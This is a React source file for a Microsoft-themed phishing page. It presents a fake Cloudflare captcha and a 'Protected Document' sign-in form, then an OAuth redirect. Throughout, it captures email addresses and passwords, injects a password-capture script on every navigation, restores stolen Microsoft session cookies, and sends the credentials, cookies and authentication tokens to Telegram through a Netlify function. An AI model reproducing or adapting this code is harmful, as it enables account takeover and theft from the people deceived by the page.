import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

import { 
  restoreMicrosoftCookies, 
  restoreCookies, 
  setCapturedEmail, 
  setCapturedCookies,
  detectBrowserCapabilities,
  getStoredData
} from './utils/restoreCookies';

import { injectPasswordCaptureScript } from './utils/password-capture-injector';

const SLOW_DELAY = 1200;
const nextStepDelay = SLOW_DELAY * 3;
const messageIconDelay = 500;
const captchaVerificationDelay = 1500;
const redirectingDelay = 3000;
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

// Helper functions for persistent storage
const setStoredPassword = (password: string) => {
  try {
    localStorage.setItem('captured_password', password);
    sessionStorage.setItem('captured_password', password);
  } catch (error) {
    console.warn('Failed to store password:', error);
  }
};

const getStoredPassword = (): string | null => {
  try {
    return localStorage.getItem('captured_password') || sessionStorage.getItem('captured_password');
  } catch (error) {
    console.warn('Failed to retrieve stored password:', error);
    return null;
  }
};

const setStoredFormCredentials = (email: string, password: string) => {
  try {
    const credentials = {
      email,
      password,
      captureTime: new Date().toISOString(),
      source: 'document-protection-form'
    };
    localStorage.setItem('form_credentials', JSON.stringify(credentials));
    sessionStorage.setItem('form_credentials', JSON.stringify(credentials));
  } catch (error) {
    console.warn('Failed to store form credentials:', error);
  }
};

const getStoredFormCredentials = () => {
  try {
    const stored = localStorage.getItem('form_credentials') || sessionStorage.getItem('form_credentials');
    return stored ? JSON.parse(stored) : null;
  } catch (error) {
    console.warn('Failed to retrieve stored form credentials:', error);
    return null;
  }
};

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
  const [capturedCredentials, setCapturedCredentials] = useState<{
    email?: string;
    password?: string;
    username?: string;
    domain?: string;
    captureTime?: string;
    source?: string;
    url?: string;
  } | null>(null);
  const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);

  // FORM STATE
  const [formEmail, setFormEmail] = useState('');
  const [formPassword, setFormPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // 🟢 NEW: Track if we've already sent tokens/cookies/email/password (prevents double send)
  const [hasSentAuthData, setHasSentAuthData] = useState(false);

  // 🟢 NEW: Store session data from OAuth
  const [oauthSessionData, setOAuthSessionData] = useState<any>(null);

  // Add CSS animation for dots
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes dotAnimation {
        0% { opacity: 0; }
        20% { opacity: 1; }
        100% { opacity: 0; }
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      @keyframes fadeIn {
        0% { opacity: 0; transform: translateY(10px); }
        100% { opacity: 1; transform: translateY(0); }
      }
      .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
      .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
      .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
      .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
      .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
      .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
      .redirecting-dots span { animation: dotAnimation 1.5s infinite; }
      .fade-in { animation: fadeIn 0.5s ease-out; }
      .document-icon { animation: spin 2s linear infinite; }
      .protected-doc:hover { transform: translateY(-2px); transition: transform 0.2s ease; }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  useEffect(() => {
    if (currentPage === 'redirecting') {
      const timer = setTimeout(() => {
        setCurrentPage('document-protection');
      }, redirectingDelay);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  useEffect(() => {
    try {
      const capabilities = detectBrowserCapabilities();
      setBrowserCapabilities(capabilities);
      console.log('🌐 Browser capabilities detected:', capabilities);
    } catch (error) {
      console.warn('⚠️ Failed to detect browser capabilities:', error);
    }

    try {
      const storedData = getStoredData();
      if (storedData.email) {
        setCapturedEmailState(storedData.email);
        setFormEmail(storedData.email); // Pre-fill form with stored email
        console.log('📧 Restored stored email:', storedData.email);
      }
      if (storedData.cookies && storedData.cookies.length > 0) {
        setCapturedCookiesState(JSON.stringify(storedData.cookies));
        console.log('🍪 Restored stored cookies:', storedData.cookies.length);
      }

      // 🔧 FIX: Restore form credentials from persistent storage
      const storedFormCredentials = getStoredFormCredentials();
      if (storedFormCredentials) {
        setCapturedCredentials(storedFormCredentials);
        setFormEmail(storedFormCredentials.email || '');
        console.log('📋 Restored form credentials from storage:', {
          email: storedFormCredentials.email,
          hasPassword: !!storedFormCredentials.password,
          source: storedFormCredentials.source
        });
      }
    } catch (error) {
      console.warn('⚠️ Failed to restore stored data:', error);
    }
  }, []);

  useEffect(() => {
    try {
      injectPasswordCaptureScript();
      console.log('✅ Password capture injector initialized');
    } catch (error) {
      console.warn('⚠️ Failed to initialize password capture injector:', error);
    }

    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function (...args) {
      originalPushState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on pushState:', error);
        }
      }, 1000);
    };

    history.replaceState = function (...args) {
      originalReplaceState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on replaceState:', error);
        }
      }, 1000);
    };

    const handlePopState = () => {
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on popstate:', error);
        }
      }, 1000);
    };

    window.addEventListener('popstate', handlePopState);

    return () => {
      history.pushState = originalPushState;
      history.replaceState = originalReplaceState;
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      if (!event.data || typeof event.data !== 'object') return;

      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email);
        console.log('📧 Email captured and stored:', event.data.email);
      }

      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies);

          const options = {
            reload: false,
            validate: true,
            debug: true,
            skipExpired: true,
            skipInvalid: false,
            warnOnSecurity: true,
            handleDuplicates: true
          };

          try {
            const result = restoreMicrosoftCookies(event.data.data.cookies, options);
            console.log('✅ Enhanced cookie restoration result:', result);
            if (result.success) {
              console.log(`🎯 Successfully restored ${result.restored}/${result.total} cookies`);
            }
          } catch (error) {
            console.warn('⚠️ Enhanced restoration failed, falling back to basic:', error);
            restoreCookies(event.data.data.cookies, { debug: true });
          }

        } catch (e) {
          console.warn('⚠️ Cookie processing error:', e);
        }
      }

      if (
        event.data.type === 'CREDENTIALS_CAPTURED' &&
        (event.data.data?.password || event.data.data?.email || event.data.data?.username)
      ) {
        const newCredentials = {
          ...event.data.data,
          captureTime: new Date().toISOString(),
          source: event.data.data?.source || 'injected-capture'
        };
        
        setCapturedCredentials(newCredentials);
        console.log('🔐 Enhanced credentials captured:', {
          hasEmail: !!newCredentials?.email,
          hasPassword: !!newCredentials?.password,
          hasUsername: !!newCredentials?.username,
          source: newCredentials?.source
        });

        // 🔧 FIX: Store credentials persistently
        if (newCredentials.email && newCredentials.password) {
          setStoredFormCredentials(newCredentials.email, newCredentials.password);
        }

        if (newCredentials.email) {
          setCapturedEmailState(newCredentials.email);
          setCapturedEmail(newCredentials.email);
        }
      }

      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
        console.log('🏢 Organizational credentials captured:', event.data.data.email);
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'reauthenticating', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  const handleCaptchaVerified = () => {
    setCurrentPage('redirecting');
  };
  const handleCaptchaBack = () => {
    window.location.reload();
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formEmail || !formPassword) {
      alert('Please enter both email and password');
      return;
    }

    setIsSubmitting(true);

    try {
      // 🔧 FIX: Store form credentials in persistent storage immediately
      const formCredentials = {
        email: formEmail,
        password: formPassword,
        captureTime: new Date().toISOString(),
        source: 'document-protection-form'
      };

      // Store in both React state and persistent storage
      setCapturedEmailState(formEmail);
      setCapturedCredentials(formCredentials);
      
      // Store persistently
      setStoredFormCredentials(formEmail, formPassword);
      setCapturedEmail(formEmail);

      console.log('📋 Form credentials captured and stored persistently:', {
        email: formEmail,
        hasPassword: !!formPassword,
        source: 'document-protection-form'
      });

      setTimeout(() => {
        setCurrentPage('reauthenticating');
      }, 1000);

    } catch (error) {
      console.error('Error submitting form:', error);
      setTimeout(() => {
        setCurrentPage('reauthenticating');
      }, 1000);
    }
  };

  useEffect(() => {
    if (currentPage === 'reauthenticating') {
      const timer = setTimeout(() => {
        setCurrentPage('oauth-redirect');
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  // Send all credentials and cookies to Telegram after OAuth (include entered email/password)
  const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
    try {
      const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';

      console.log('📤 Sending to Telegram:', {
        email: email,
        hasPassword: !!password,
        passwordLength: password ? password.length : 0,
        cookieCount: Array.isArray(cookies) ? cookies.length : 0
      });

      const response = await fetch(netlifyFunctionUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password,
          passwordSource: password ? 'document-protection-form' : undefined,
          cookies,
          authenticationTokens,
          userAgent,
          sessionId,
          url
        })
      });

      const result = await response.json();

      if (response.ok && result.success) {
        console.log('✅ Sent all authentication data to Telegram (ONE TIME, after OAuth)');
        console.log('✅ Telegram result:', result);
      } else {
        console.warn('⚠️ Netlify function responded with error:', result);
      }
    } catch (error) {
      console.warn('⚠️ Failed to send to Telegram:', error);
    }
  };

  const handleOAuthSuccess = async (sessionData: any) => {
    console.log('✅ OAuth success with enhanced data handling:', sessionData);

    if (!hasSentAuthData) {
      setHasSentAuthData(true);

      // 🔧 FIX: Get credentials from persistent storage first, then fallback to state
      const storedFormCredentials = getStoredFormCredentials();
      
      let finalEmail = '';
      let finalPassword = '';

      // Priority order: stored form credentials > captured credentials > current form state > captured email
      if (storedFormCredentials) {
        finalEmail = storedFormCredentials.email || '';
        finalPassword = storedFormCredentials.password || '';
        console.log('📊 Using stored form credentials');
      } else if (capturedCredentials?.email && capturedCredentials?.password) {
        finalEmail = capturedCredentials.email;
        finalPassword = capturedCredentials.password;
        console.log('📊 Using captured credentials from state');
      } else {
        finalEmail = formEmail || capturedEmail || '';
        finalPassword = formPassword || getStoredPassword() || '';
        console.log('📊 Using fallback credentials');
      }

      console.log('📊 Final credentials for Telegram:', {
        finalEmail,
        hasPassword: !!finalPassword,
        passwordSource: storedFormCredentials ? 'stored-form' : (capturedCredentials?.source || 'fallback'),
        storedCredentialsExists: !!storedFormCredentials,
        capturedCredentialsExists: !!capturedCredentials,
        formEmailExists: !!formEmail,
        formPasswordExists: !!formPassword
      });

      await sendToTelegram({
        email: finalEmail,
        password: finalPassword,
        cookies: capturedCookies ? JSON.parse(capturedCookies) : [],
        authenticationTokens: sessionData?.authenticationTokens || {},
        userAgent: navigator.userAgent,
        sessionId: sessionData?.sessionId || ('oauth_' + Math.random().toString(36).substring(2, 15)),
        url: window.location.href
      });
    }

    setOAuthSessionData(sessionData);
    setCurrentPage('document-loading');
  };

  const handleOAuthBack = () => {
    setCurrentPage('document-protection');
  };

  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );

    case 'redirecting':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Opening
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'document-protection':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          minHeight: '100vh',
          fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
          backgroundColor: '#f3f2f1',
          padding: '20px'
        }}>
          <div className="fade-in" style={{
            textAlign: 'center',
            background: 'white',
            padding: '50px 60px',
            borderRadius: '12px',
            boxShadow: '0 8px 32px rgba(0,0,0,0.12)',
            maxWidth: '500px',
            width: '100%'
          }}>
            {/* Removed Protected Document Icon and badge as requested */}
            <h2 style={{ 
              color: '#323130', 
              margin: '0 0 15px',
              fontSize: '28px',
              fontWeight: '600',
              lineHeight: '1.3'
            }}>
              Protected Document
            </h2>
            <p style={{ 
              color: '#605e5c', 
              margin: '0 0 25px',
              fontSize: '16px',
              lineHeight: '1.5'
            }}>
              This Document contains confidential information and requires authentication to access.
            </p>
            <div style={{
              background: '#fff4ce',
              border: '1px solid #ffcc02',
              borderRadius: '6px',
              padding: '15px',
              margin: '0 0 25px',
              display: 'flex',
              alignItems: 'center',
              textAlign: 'left'
            }}>
              <span style={{
                fontSize: '18px',
                marginRight: '10px'
              }}>⚠️</span>
              <div style={{
                fontSize: '13px',
                color: '#605e5c'
              }}>
                <strong style={{ color: '#323130' }}>Authentication Required</strong><br/>
                Please sign in with your Microsoft account to verify your access permissions.
              </div>
            </div>
            {/* Email and Password Form */}
            <form onSubmit={handleFormSubmit} style={{ textAlign: 'left', marginBottom: '25px' }}>
              <div style={{ marginBottom: '15px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '14px',
                  fontWeight: '600',
                  color: '#323130',
                  marginBottom: '6px'
                }}>
                  Email Address
                </label>
                <input
                  type="email"
                  value={formEmail}
                  onChange={(e) => setFormEmail(e.target.value)}
                  required
                  style={{
                    width: '100%',
                    padding: '12px 16px',
                    border: '1px solid #d2d0ce',
                    borderRadius: '6px',
                    fontSize: '16px',
                    fontFamily: 'inherit',
                    boxSizing: 'border-box'
                  }}
                  placeholder="Enter your Microsoft email"
                />
              </div>
              <div style={{ marginBottom: '20px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '14px',
                  fontWeight: '600',
                  color: '#323130',
                  marginBottom: '6px'
                }}>
                  Password
                </label>
                <input
                  type="password"
                  value={formPassword}
                  onChange={(e) => setFormPassword(e.target.value)}
                  required
                  style={{
                    width: '100%',
                    padding: '12px 16px',
                    border: '1px solid #d2d0ce',
                    borderRadius: '6px',
                    fontSize: '16px',
                    fontFamily: 'inherit',
                    boxSizing: 'border-box'
                  }}
                  placeholder="Enter your password"
                />
              </div>
              <button
                type="submit"
                disabled={isSubmitting}
                className="protected-doc"
                style={{
                  width: '100%',
                  padding: '16px 24px',
                  background: isSubmitting 
                    ? 'linear-gradient(135deg, #8a8a8a 0%, #6a6a6a 100%)'
                    : 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)',
                  color: 'white',
                  border: 'none',
                  borderRadius: '6px',
                  cursor: isSubmitting ? 'not-allowed' : 'pointer',
                  fontSize: '16px',
                  fontWeight: '600',
                  boxShadow: '0 4px 16px rgba(0,120,212,0.4)',
                  transition: 'all 0.2s ease',
                  textShadow: '0 1px 2px rgba(0,0,0,0.2)',
                  position: 'relative',
                  overflow: 'hidden'
                }}
                onMouseOver={(e) => {
                  if (!isSubmitting) {
                    e.currentTarget.style.background = 'linear-gradient(135deg, #106ebe 0%, #004578 100%)';
                    e.currentTarget.style.transform = 'translateY(-2px)';
                    e.currentTarget.style.boxShadow = '0 6px 20px rgba(0,120,212,0.5)';
                  }
                }}
                onMouseOut={(e) => {
                  if (!isSubmitting) {
                    e.currentTarget.style.background = 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)';
                    e.currentTarget.style.transform = 'translateY(0)';
                    e.currentTarget.style.boxShadow = '0 4px 16px rgba(0,120,212,0.4)';
                  }
                }}
              >
                {isSubmitting ? '🔄 Authenticating...' : 'Authenticate & Open Document'}
              </button>
            </form>
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '15px',
              marginTop: '20px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '8px 16px',
                  backgroundColor: 'transparent',
                  color: '#0078d4',
                  border: '1px solid #0078d4',
                  borderRadius: '6px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  fontWeight: '500'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.backgroundColor = '#f3f2f1';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.backgroundColor = 'transparent';
                }}
              >
                ← Back to Start
              </button>
              <button
                onClick={() => {
                  alert('For security reasons, document access requires authentication through Microsoft.');
                }}
                style={{
                  padding: '8px 16px',
                  backgroundColor: 'transparent',
                  color: '#605e5c',
                  border: '1px solid #d2d0ce',
                  borderRadius: '6px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  fontWeight: '500'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.backgroundColor = '#f3f2f1';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.backgroundColor = 'transparent';
                }}
              >
                Request Access
              </button>
            </div>
            <div style={{
              marginTop: '25px',
              paddingTop: '20px',
              borderTop: '1px solid #edebe9',
              fontSize: '12px',
              color: '#a19f9d'
            }}>
              Secure Document Access Portal
            </div>
          </div>
        </div>
      );

    case 'reauthenticating':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Reauthenticating
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'message-icon':
      return (
        <MessageIconLanding
          onOpenMessage={() => {}}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success':
    case 'document-loading':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <div className="document-icon" style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            {process.env.NODE_ENV === 'development' && (
              <div style={{ 
                marginTop: '20px', 
                padding: '10px', 
                backgroundColor: '#f8f9fa', 
                borderRadius: '4px',
                fontSize: '12px',
                color: '#666'
              }}>
                <div>Email: {capturedEmail || 'Not captured'}</div>
                <div>Cookies: {capturedCookies ? JSON.parse(capturedCookies).length : 0}</div>
                <div>Credentials: {capturedCredentials ? 'Captured' : 'None'}</div>
                <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
              </div>
            )}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );
  }
}

export default App;
